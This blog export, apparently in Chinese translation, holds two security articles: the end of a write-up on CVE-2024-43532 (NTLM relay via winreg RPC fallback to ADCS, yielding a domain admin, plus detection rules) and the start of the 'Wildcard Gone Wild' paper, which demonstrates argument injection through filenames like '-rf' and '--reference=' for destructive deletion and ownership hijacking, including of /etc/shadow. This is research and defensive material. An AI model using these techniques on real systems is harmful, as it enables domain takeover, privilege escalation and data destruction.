<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmE0NGUwNDI1Njk1MTMzYmMwYzg0ZDZlNzBhNDBkNDBfZ0FJOFR2bWcxdXkzTUhUY01mTFZOM1JnT0NYZDJXY09fVG9rZW46WllKaGJwOWZ6b2JNcE94ZG1xa2NHUlJXbmtjXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NzExNDYzYjljYmMzNTI2NWI1YjY1OWJkOTAwOWZjMmFfWDFpdlc5M3RMQ3p2UnNjRWE0d25KNTVPMHJzOFhHU0xfVG9rZW46SXRxT2JjRldKb2M2WGF4R1VXS2NWSngyblVjXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 6: Function pointers and the function array inside BaseBindToMachine图 6：BaseBindToMachine 内的函数指针和函数数组</p>
<p>The fallback to TCP&#x2F;IP is quite promising, as it means we can use the insecure authentication method to relay the traffic using a machine-in-the-middle attack without the client noticing. While it is possible with the other transport protocols as well, they are quite obsolete, so it might be unrealistic to find them in a modern network (and using them might trigger some alarm bells). TCP&#x2F;IP is a lot more common as an RPC transport, so it should be okay even in a red team setting.TCP&#x2F;IP 的回退是非常有前途的，因为这意味着我们可以使用不安全的身份验证方法，通过中间机器攻击来中继流量，而无需客户端注意。虽然其他传输协议也是可能的，但它们已经过时了，因此在现代网络中找到它们可能是不现实的（并且使用它们可能会触发一些警钟）。 TCP&#x2F;IP 作为 RPC 传输更为常见，因此即使在红队环境中也应该没问题。</p>
<p>It is important to know that both <em>BaseBindToMachine</em> and *RegConnectRegistryExW *accept a flag as an argument that prevents the fallback behavior, but the basic function RegConnectRegistryW calls *RegConnectRegistryExW *without that flag present.重要的是要知道 BaseBindToMachine 和 RegConnectRegistryExW 都接受一个标志作为防止回退行为的参数，但基本函数 RegConnectRegistryW 在没有该标志的情况下调用 RegConnectRegistryExW。</p>
<h2 id="The-relay-process中继过程"><a href="#The-relay-process中继过程" class="headerlink" title="The relay process中继过程"></a>The relay process中继过程</h2><p>Relaying is quite simple since NTLM relay is a common technique. Most of the logic we need is already implemented in <a href="https://github.com/fortra/impacket/">Impacket</a>’s ntlmrelayx, which is what we’ll use the most.中继非常简单，因为 NTLM 中继是一种常用技术。我们需要的大部分逻辑已经在 Impacket 的 ntlmrelayx 中实现，这也是我们最常用的。</p>
<h3 id="Building-the-RPC-relay-server构建RPC中继服务器"><a href="#Building-the-RPC-relay-server构建RPC中继服务器" class="headerlink" title="Building the RPC relay server构建RPC中继服务器"></a>Building the RPC relay server构建RPC中继服务器</h3><p>What ntlmrelayx lacks is a TCP&#x2F;IP RPC server, as it implemented only an SMB server. As such, we’ll need to build our own relay server, which rejects the winreg named pipe to trigger a fallback to the TCP&#x2F;IP binding function.ntlmrelayx 缺少的是 TCP&#x2F;IP RPC 服务器，因为它只实现了 SMB 服务器。因此，我们需要构建自己的中继服务器，该服务器拒绝 winreg 命名管道以触发 TCP&#x2F;IP 绑定功能的回退。</p>
<p>There are three critical points we need to implement:我们需要实施三个关键点：</p>
<ol>
<li>The RPC endpoint mapperRPC端点映射器</li>
<li>The RPC bind request with NTLM与 NTLM 的 RPC 绑定请求</li>
<li>The NTLM challengeNTLM 挑战</li>
</ol>
<p>The RPC endpoint mapper is responsible for translating RPC interface UUIDs into their respective endpoints, which in the case of the TCP&#x2F;IP transport, would be a port number. Unlike SMB, where the endpoints are named pipes that are unique and can be known in advance, the TCP endpoints use ephemeral ports, so another layer of translation is necessary.RPC 端点映射器负责将 RPC 接口 UUID 转换为其各自的端点，在 TCP&#x2F;IP 传输的情况下，这将是端口号。与 SMB 不同，SMB 的端点是唯一且可以提前知道的命名管道，而 TCP 端点使用临时端口，因此需要另一层转换。</p>
<p>The critical part is the NTLM-related issues. The way RPC binding works with NTLM is that an NTLM negotiation message is sent during the bind request, then an NTLM challenge is sent with the bind response. Finally, the client has to send another message, called AUTH3, with the challenge response (Figure 7).关键部分是NTLM相关问题。 RPC 绑定与 NTLM 结合使用的方式是，在绑定请求期间发送 NTLM 协商消息，然后随绑定响应一起发送 NTLM 质询。最后，客户端必须发送另一条名为 AUTH3 的消息以及质询响应（图 7）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NzEwMmI4YjA5ZWI0Zjc5OTFlODY0MWNjYzUxYjM5MjlfdE9HZ2tac3Z6bmRYNUJuaTQ4OGxUS1hZRTg4SmpGc0ZfVG9rZW46RTdWTmJKRm41b0pCRWp4WUtBWGNneXh5blRjXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdmMzcwZTgxM2QxNDgwNzliOGZlN2Q0MDQwYTZjNjlfVFU0TndIYTlUalRHVXdCQjRwS2k3YmlYMGpMZUszb0dfVG9rZW46Um5JMGJtRXBob0g4NHZ4RENVNmNFMzQxbjNiXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 7: NTLM authentication over RPC binding图 7：通过 RPC 绑定进行 NTLM 身份验证</p>
<p>To relay, we just have to parse the corresponding messages in our RPC server. Once we see an NTLM negotiate message in a bind message, we open our own connection to our target authentication server and also request to authenticate via NTLM. Then, we just have to capture the challenge the server sends us, relay it back to the victim, and relay the response back to the server to get our own authenticated session.要进行中继，我们只需在 RPC 服务器中解析相应的消息即可。一旦我们在绑定消息中看到 NTLM 协商消息，我们就会打开与目标身份验证服务器的连接，并请求通过 NTLM 进行身份验证。然后，我们只需捕获服务器发送给我们的质询，将其转发回受害者，并将响应转发回服务器以获得我们自己的经过身份验证的会话。</p>
<p>All we need to consider is which server we want to relay the authentication.我们需要考虑的是我们想要中继身份验证的服务器。</p>
<h2 id="RPC-to-RPC-relayRPC-到-RPC-中继"><a href="#RPC-to-RPC-relayRPC-到-RPC-中继" class="headerlink" title="RPC to RPC relayRPC 到 RPC 中继"></a>RPC to RPC relayRPC 到 RPC 中继</h2><p>The immediate thought would be to relay to another RPC server on a different machine, like the service manager or the task scheduler, and achieve a remote code execution that way. The issue with this, however, is  that no one uses insecure authentication via RPC anymore, so we can’t relay to any high-profile RPC server. (This lack of insecure authentication via RPC is the same reason we had limited research targets.)最直接的想法是中继到不同机器上的另一个 RPC 服务器，例如服务管理器或任务调度程序，并以这种方式实现远程代码执行。然而，这样做的问题是，没有人再通过 RPC 使用不安全的身份验证，因此我们无法中继到任何高调的 RPC 服务器。 （缺乏通过 RPC 进行的不安全身份验证与我们研究目标有限的原因相同。）</p>
<p>Both the service manager and the task scheduler RPC servers require RPC_C_AUTHN_LEVEL_PKT_PRIVACY, which encrypts the entirety of the traffic with the client’s NTLMv2 hash, which we don’t know even with the relay. Instead, we have to look at a different angle.服务管理器和任务调度程序 RPC 服务器都需要 RPC_C_AUTHN_LEVEL_PKT_PRIVACY，它使用客户端的 NTLMv2 哈希加密整个流量，即使使用中继，我们也不知道该哈希。相反，我们必须换个角度来看。</p>
<h2 id="RPC-to-ADCSRPC-到-ADCS"><a href="#RPC-to-ADCSRPC-到-ADCS" class="headerlink" title="RPC to ADCSRPC 到 ADCS"></a>RPC to ADCSRPC 到 ADCS</h2><p>Luckily, the guys at SpecterOps have done a lot of work on <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">ADCS</a>; specifically on NTLM relay to ADCS. This is also implemented in Impacket by default, so all we have to do is pass our authenticated session to Impacket’s <em>HTTPAttack</em> module and let the magic happen by itself.幸运的是，SpectreOps 的人员在 ADCS 方面做了很多工作；特别是关于 ADCS 的 NTLM 中继。默认情况下，这也在 Impacket 中实现，因此我们所要做的就是将经过身份验证的会话传递给 Impacket 的 HTTPAttack 模块，然后让魔法自行发生。</p>
<p>ADCS’s HTTP web server doesn’t require any security and is vulnerable to relay attacks. By abusing that, once we authenticate to it, we can request a user certificate, which we can then use by itself to authenticate, without having to go through the trouble of relaying the authentication again (Figure 8).ADCS 的 HTTP Web 服务器不需要任何安全性，并且容易受到中继攻击。通过滥用这一点，一旦我们对其进行身份验证，我们就可以请求用户证书，然后我们可以使用该证书本身进行身份验证，而无需再次经历中继身份验证的麻烦（图 8）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NWMxZjkzNDBkZGZmMjlmNDA4ZGEzN2U5ZjEzM2FmZTdfbENjcmNlRG5WT21uaG9WazhzeTVzWXhyVDN1dHZSSkVfVG9rZW46UzhTeWJjQ3o0b1UzZ0N4QWlBcWNsTFNpbjVjXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig 8: Requesting and receiving a certificate from ADCS following an NTLM relay attack图8：NTLM继电器攻击后请求并收到ADC的证书</p>
<p>We used this certificate to authenticate to the LDAP service on the domain controller and create a persistent new domain admin in the compromised domain (Figure 9).我们使用此证书对域控制器上的 LDAP 服务进行身份验证，并在受感染的域中创建持久的新域管理员（图 9）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIzNTA0MDIyNzc5OTUzOWFiNjA4ZWE4ZGNhMzQ2NmNfV1FhNWhRWTFWcmFpZVFHcEN4N1dnazlpS0s4N0NGdVRfVG9rZW46UjJuR2IxS3Zsb0FYWGJ4bWZoUGNxU3VFbnNjXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig 9: Creating a new domain admin using an LDAP shell图 9：使用 LDAP shell 创建新的域管理员</p>
<h2 id="Potential-impact潜在影响"><a href="#Potential-impact潜在影响" class="headerlink" title="Potential impact潜在影响"></a>Potential impact潜在影响</h2><p>A function in advapi isn’t interesting by itself, it is only impactful if something else is using it. A quick lookup of imports of <em>RegConnectRegistryExW</em> or <em>RegConnectRegistryExA</em> doesn’t show anything on an up-to-date domain controller, but a search for <em>RegConnectRegistryW</em> uncovers a lot of potential candidates, like certutil and certsrv (AD CS), EFS, DFS, and more.advapi 中的函数本身并不有趣，只有当其他东西使用它时它才会产生影响。快速查找 RegConnectRegistryExW 或 RegConnectRegistryExA 的导入不会在最新的域控制器上显示任何内容，但搜索 RegConnectRegistryW 会发现许多潜在的候选者，例如 certutil 和 certsrv (AD CS)、EFS、DFS 和更多的。</p>
<h2 id="Detection检测"><a href="#Detection检测" class="headerlink" title="Detection检测"></a>Detection检测</h2><p>The Remote Registry service isn’t enabled by default on all Windows machines. It is possible to detect it’s status using the following osquery:默认情况下，并非所有 Windows 计算机上都启用远程注册表服务。可以使用以下 osquery 检测其状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT display_name, status, start_type, pid FROM services WHERE name=<span class="string">&#x27;RemoteRegistry&#x27;</span></span><br></pre></td></tr></table></figure>

<p>This, however, doesn’t protect from <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-43532">CVE-2024-43532</a>, as it is a client issue. The results of the query should raise actual use cases for the Remote Registry in the organization that you might need to account for when hardening your systems.然而，这并不能防止 CVE-2024-43532，因为这是一个客户端问题。查询结果应提出组织中远程注册表的实际用例，您在强化系统时可能需要考虑这些用例。</p>
<p>To detect clients that use any of the vulnerable WinAPI, you can use the following YARA rule:要检测使用任何易受攻击的 WinAPI 的客户端，您可以使用以下 YARA 规则：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span><span class="string">&quot;pe&quot;</span></span><br><span class="line">rule winreg_client_import &#123;</span><br><span class="line">    meta:</span><br><span class="line">        description =  <span class="string">&quot;Detect binaries that rely on RegConnectRegistry&quot;</span></span><br><span class="line">        author = <span class="string">&quot;Stiv Kupchik with Akamai Technologies&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        pe.is_pe <span class="keyword">and</span> (</span><br><span class="line">            pe.imports(pe.IMPORT_ANY, <span class="string">&quot;advapi32.dll&quot;</span>, <span class="string">&quot;RegConnectRegistryA&quot;</span>)</span><br><span class="line"><span class="keyword">or</span> pe.imports(pe.IMPORT_ANY, <span class="string">&quot;advapi32.dll&quot;</span>, <span class="string">&quot;RegConnectRegistryW&quot;</span>)</span><br><span class="line"><span class="keyword">or</span> pe.imports(pe.IMPORT_ANY, <span class="string">&quot;advapi32.dll&quot;</span>, <span class="string">&quot;RegConnectRegistryExA&quot;</span>)</span><br><span class="line"><span class="keyword">or</span> pe.imports(pe.IMPORT_ANY, <span class="string">&quot;advapi32.dll&quot;</span>, <span class="string">&quot;RegConnectRegistryExW&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.akamai.com/products/akamai-guardicore-segmentation">Akamai Guardicore Segmentation</a> users can also create policy rules for traffic coming into the RemoteRegistry service (Figure 10).Akamai Guardicore Segmentation 用户还可以为进入 RemoteRegistry 服务的流量创建策略规则（图 10）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVhNzY2Mjc1OGI4ODdmMGY5Yjg0MWI5YTY4YjdlNzdfVWt6cGtZSDlUenJMVVF5Y2wyR3JjdmRnTVBFWUJYVGRfVG9rZW46WkhRMWJ4UTVGb3dCMUd4MGlSNGNzM1NHblliXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 10: Segmentation policy rule to alert on traffic to the RemoteRegistry service图 10：针对 RemoteRegistry 服务的流量发出警报的分段策略规则</p>
<p>It is also possible to use Event Tracing for Windows (ETW) to monitor RPC traffic on both client and server sides of the communication. We’ve elaborated on this topic in our presentation at <a href="https://www.youtube.com/watch?v=iAsavoHcm2I">Black Hat 2023</a> and its <a href="https://www.akamai.com/blog/security-research/msrpc-defense-measures-in-windows-etw">accompanying blog post</a>. Users can use our <a href="https://github.com/akamai/akamai-security-research/tree/main/rpc_toolkit/rpc_visibility">RPC visibility open-source tool</a> to track RPC calls and filter for the WinReg RPC interface UUID  <em>{338cd001-2244-31f1-aaaa-900038001003}</em> .还可以使用 Windows 事件跟踪 (ETW) 来监视通信客户端和服务器端的 RPC 流量。我们在 Black Hat 2023 的演讲及其随附的博客文章中详细阐述了这个主题。用户可以使用我们的 RPC 可见性开源工具来跟踪 RPC 调用并过滤 WinReg RPC 接口 UUID {338cd001-2244-31f1-aaaa-900038001003}。</p>
<h2 id="Conclusion结论"><a href="#Conclusion结论" class="headerlink" title="Conclusion结论"></a>Conclusion结论</h2><p>Although the RPC protocol — and MS-RPC — were built with security in mind, we can clearly see the evolution of security principles over time by analyzing various RPC interface implementations. While most RPC servers and clients are secure nowadays, it is possible, from time to time, to uncover relics of insecure implementation to varying degrees.尽管 RPC 协议和 MS-RPC 在构建时就考虑到了安全性，但通过分析各种 RPC 接口实现，我们可以清楚地看到安全原则随时间的演变。虽然现在大多数 RPC 服务器和客户端都是安全的，但有时仍可能会不同程度地发现不安全实现的遗留问题。</p>
<p>In this case, we managed to achieve NTLM relay, which is a class of attacks that better belongs to the past. This just proves that network defenses must be as thorough as possible because you never know which ancient interface is still exposed or running.在这种情况下，我们成功实现了 NTLM 中继，这是一类更好地属于过去的攻击。这恰恰证明网络防御必须尽可能彻底，因为你永远不知道哪个古老的接口仍然暴露或运行。</p>
]]></content>
      <categories>
        <category>How It Works-临渊羡鱼</category>
        <category>CVE</category>
        <category>译</category>
      </categories>
  </entry>
  <entry>
    <title>Wildcard Gone Wild：Unix 通配符攻击-译</title>
    <url>/post/20250930170102.html</url>
    <content><![CDATA[<blockquote>
<p>原文：<a href="https://www.exploit-db.com/papers/33930">https://www.exploit-db.com/papers/33930</a><br>作者：- Leon Juranic <a href="mailto:&#108;&#x65;&#x6f;&#x6e;&#x40;&#100;&#101;&#102;&#x65;&#110;&#115;&#101;&#x63;&#111;&#x64;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#108;&#x65;&#x6f;&#x6e;&#x40;&#100;&#101;&#102;&#x65;&#110;&#115;&#101;&#x63;&#111;&#x64;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a><br>创建日期：2013&#x2F;04&#x2F;20<br>发布日期：2014&#x2F;06&#x2F;25</p>
</blockquote>
<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>首先，这篇文章没有像ASLR绕过、POP利用、0day远程内核漏洞或者Chrome上那种需要”串14个不同的bug才能到达目标”的现代黑客技术。本文要介绍的是一种有趣的老派的Unix黑客技巧，直到2013年仍然有效。让我惊讶的是很多安全从业者都没有听说过这种技巧。可能是此前没人正式讨论过它。</p>
<p>我决定写本文的原因很简单：就我个人而言，仅凭一些简单的Unix通配符投毒就能完成一些目的很有趣。因此，你也可以吧本文当作一组精巧的 <code>*nix</code>黑客技巧合集，据我所知，它们之前还没有被系统呈现过。</p>
<p>如果你想知道如何使用 <code>tar</code>或者 <code>chown</code>这样基础的Unix工具完全攻陷系统，请继续读下去。请坐稳、系好安全带，我们要一路回到80年代，直抵Unix Shell黑客世界。（背景里是不是响起了那种糟糕发型摇滚&#x2F;律动迪斯科？我想是的……）</p>
<h1 id="Unix通配符"><a href="#Unix通配符" class="headerlink" title="Unix通配符"></a>Unix通配符</h1><p>如果你已经知道了什么是Unix通配符，以及它们是如何在shell脚本中使用的，可以跳过本节。</p>
<p><strong>通配符</strong>是一个字符或者一组字符，用于替代某个范围&#x2F;类别的字符，在执行其他动作之前，通配符由shell解释。<br>一些常见的通配符：</p>
<ul>
<li><code>*</code> 星号匹配文件名中的<strong>任意数量</strong>字符（包括零个）。</li>
<li><code>?</code> 问号匹配<strong>任意单个</strong>字符。</li>
<li><code>[ ]</code> 方括号包裹一个字符集合，其中<strong>任意一个</strong>字符都可以在该位置匹配。</li>
<li><code>-</code> 在方括号内使用连字符表示一个<strong>范围</strong>。</li>
<li><code>~</code> 位于单词开头时展开为你的<strong>主目录</strong>。若其后接上其他用户的登录名，则表示<strong>该用户</strong>的主目录。<br>通配符的基本使用示例:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls *.php  </span><br><span class="line">列出所有以 .php 结尾的文件</span><br><span class="line"></span><br><span class="line">rm *.gz</span><br><span class="line">删除所有 GZIP 文件</span><br><span class="line"></span><br><span class="line">cat backup*</span><br><span class="line">显示所有以 backup 开头的文件内容</span><br><span class="line"></span><br><span class="line">ls test?</span><br><span class="line">列出所有以 test 开头且恰好再多一个字符的文件</span><br></pre></td></tr></table></figure>

<h1 id="通配符Wilderness"><a href="#通配符Wilderness" class="headerlink" title="通配符Wilderness"></a>通配符Wilderness</h1><p>顾名思义，通配符天生就是狂野的(wild),在某些场景中他们甚至会失控(go berserk)。<br>在最初玩这些有趣的通配符技巧时，我和一些老派的(old school) Unix管理员以及安全从业者交流，看看他们当中有多少人了解这些技巧以及潜在的危险。令我惊讶的是20个人里面只有2个人表示知道：在使用通配符时，特别是 <code>rm</code>命令时，要格外谨慎，因为有人可能会利用”看起来像是参数的文件名（argument-like-filename)”。 其中一位说他多年前在某个基础的Linux管理课程里听说过此事。</p>
<p>这个技巧背后的原理很简单：当使用shell通配符时，尤其是 <code>*（asterisk）</code>时，Unix shell会把以 <code>-(hyphen)</code> 开头的文件名解析为<strong>要执行的命令&#x2F;程序的命令行参数</strong>。这就给经典的”通道混淆（channeling）”攻击留下来空间。</p>
<p>当不同的信息通道被混合到同一个通道时，就会出现”通道混淆”问题。本文中具体场景，就是因为通配符的使用把”参数”和”文件名”这两个不同的”通道”混淆了。下面看一个非常基础的”通配符导致<strong>参数注入</strong>”的例子。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 20</span><br><span class="line">drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .</span><br><span class="line">drwx------. 22 leon   leon   4096 Oct 28 16:15 ..</span><br><span class="line">drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1</span><br><span class="line">drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2</span><br><span class="line">drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3</span><br><span class="line">-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt</span><br><span class="line">-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt</span><br><span class="line">-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file3.txt</span><br><span class="line">-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf</span><br></pre></td></tr></table></figure>

<p>有一个名为 <code>-rf</code>的文件，它的所有者是 <code>nobody</code>，现在我们运行 <code>rm *</code>再来看看目录内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">rm</span> *</span><br><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 8</span><br><span class="line">drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .</span><br><span class="line">drwx------. 22 leon   leon   4096 Oct 28 16:15 ..</span><br><span class="line">-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf</span><br></pre></td></tr></table></figure>

<p>目录被清空了，只剩下 <code>-rf</code>这个文件，所有文件和目录都被递归删除。<br>当我们用 <code>*</code>作为参数执行 <code>rm</code>时，当前目录下的所有文件名都会作为命令行参数传递给 <code>rm</code>，等价于</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf</span><br></pre></td></tr></table></figure>

<p>因为当前目录里有一个名为 <code>-rf</code> 的<strong>文件</strong>，<code>rm</code> 把它当成了<strong>选项</strong>（<code>-rf</code>）放在了最后，于是把所有东西都递归地删了。<br>我们用 <code>strace</code> 也能看到这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[leon@defensecode WILD]$ strace <span class="built_in">rm</span> *</span><br><span class="line">execve(<span class="string">&quot;/bin/rm&quot;</span>, [<span class="string">&quot;rm&quot;</span>, <span class="string">&quot;DIR1&quot;</span>, <span class="string">&quot;DIR2&quot;</span>, <span class="string">&quot;DIR3&quot;</span>, <span class="string">&quot;file1.txt&quot;</span>, <span class="string">&quot;file2.txt&quot;</span>,</span><br><span class="line"><span class="string">&quot;file3.txt&quot;</span>, <span class="string">&quot;-rf&quot;</span>], [/* 25 vars */]) = 0</span><br><span class="line">              ^- 就在这里</span><br></pre></td></tr></table></figure>

<p>现在我们知道了，为什么可以向 Unix 程序<strong>注入任意参数</strong>。下一节会讲讲如何滥用这个“特性”，做的不仅仅是“递归删文件”。</p>
<h1 id="更有用的东西"><a href="#更有用的东西" class="headerlink" title="更有用的东西"></a>更有用的东西</h1><p>既然我们已经知道如何向shell命令注入任意参数，那就来演示几个比”递归删除文件”更有用的例子。<br>最初我玩到这个通配符技巧后，就开始寻找一些常见的、基础的Unix程序，看它们在接收到意外参数时，会不会收到严重影响。在真是世界中，下面这些例子既可以在交互式shell里执行，也可以通过定时任务(cron)、shell脚本、web应用触发的命令等路径被滥用。<br>一下的示例里，攻击者都用lemon 账号，受害者是root</p>
<h2 id="chown的文件引用利用技巧（文件所有者劫持）"><a href="#chown的文件引用利用技巧（文件所有者劫持）" class="headerlink" title="chown的文件引用利用技巧（文件所有者劫持）"></a>chown的文件引用利用技巧（文件所有者劫持）</h2><p>第一个有趣的目标是chown<br>假设我们有一个<strong>可公开写入</strong>的目录，里面一堆文件，root想把所有php文件属主改为 <code>nobody</code>,请注意下面文件列表中的所有者：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 52</span><br><span class="line">drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .</span><br><span class="line">drwx------. 22 user user 4096 Oct 28 17:34 ..</span><br><span class="line">-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php</span><br><span class="line">-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php</span><br><span class="line">-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php</span><br><span class="line">-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php</span><br><span class="line">-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php</span><br><span class="line">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span><br><span class="line">-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php</span><br><span class="line">-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php</span><br><span class="line">-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php</span><br><span class="line">-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php</span><br><span class="line">-rw-rw-r--.  1 user user  117 Oct 28 17:36 inc.php</span><br><span class="line">-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php</span><br><span class="line">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span><br><span class="line">-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php</span><br><span class="line">-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php</span><br></pre></td></tr></table></figure>

<p>这些公共目录里的文件大多归 <code>user</code> 所有，<code>root</code> 现在要把它们改为 <code>nobody</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">chown</span> -R nobody:nobody *.php</span><br></pre></td></tr></table></figure>

<p>执行之后，再看一眼文件的所有者：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 52</span><br><span class="line">drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .</span><br><span class="line">drwx------. 22 user user 4096 Oct 28 17:34 ..</span><br><span class="line">-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php</span><br><span class="line">-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php</span><br><span class="line">-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php</span><br><span class="line">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span><br><span class="line">-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php</span><br><span class="line">-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  117 Oct 28 17:36 inc.php</span><br><span class="line">-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php</span><br><span class="line">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span><br><span class="line">-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php</span><br><span class="line">-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php</span><br></pre></td></tr></table></figure>

<p>超级用户明明想把属主改成 <code>nobody:nobody</code>，结果<strong>所有文件都变成 <code>leon</code> 拥有</strong>了。<br>仔细看，这个目录里来自 <code>leon</code> 的文件只有这两个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php</span><br><span class="line">-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php</span><br></pre></td></tr></table></figure>

<p>问题在于：<code>chown</code> 命令行里使用了通配符，于是<strong>任意的</strong> <code>--reference=.drf.php</code> 这个<strong>文件名</strong>被当成<strong>选项</strong>传给了 <code>chown</code>。<br>看 <code>chown</code> 的手册（<code>man chown</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--reference=RFILE</span><br><span class="line">       use RFILE&#x27;s owner and group rather than specifying OWNER:GROUP values</span><br></pre></td></tr></table></figure>

<p>也就是说，<code>--reference</code> 选项会<strong>覆盖</strong>命令中指定的 <code>nobody:nobody</code>，把目标文件的属主&#x2F;属组改成<strong>参考文件 <code>.drf.php</code> 的属主&#x2F;属组</strong>，而 <code>.drf.php</code> 是 <code>leon</code> 的。顺带一提，<code>.drf</code> 是 <strong>Dummy Reference File（虚拟参考文件）</strong> 的缩写 :）</p>
<p>总结一下：通过 <code>--reference</code>，我们可以把文件的所有权改成<strong>任意用户</strong>。如果把 <code>--reference</code> 指向另一个用户拥有的某个文件，那这个用户就会成为当前目录所有文件的拥有者。<br>借助这种 <code>chown</code> 参数污染，我们可以<strong>诱使 root</strong> 把文件<strong>改属</strong>为任意用户，实际上完成“文件劫持”。<br>更进一步，如果 <code>leon</code> 事先在该目录里创建了一个<strong>符号链接</strong>指向 <code>/etc/shadow</code>，那么 <code>/etc/shadow</code> 的所有权也会被改成 <code>leon</code>。</p>
<h2 id="chown的文件引用利用技巧"><a href="#chown的文件引用利用技巧" class="headerlink" title="chown的文件引用利用技巧"></a>chown的文件引用利用技巧</h2><p>与上面的 <code>chown</code> 攻击类似，<code>chmod</code> 同样有 <code>--reference</code> 选项，可以被滥用来对由星号通配选中的文件设置<strong>任意权限</strong>。<code>chmod</code> 手册（<code>man chmod</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--reference=RFILE</span><br><span class="line">       use RFILE&#x27;s mode instead of MODE values</span><br></pre></td></tr></table></figure>

<p>示例:</p>
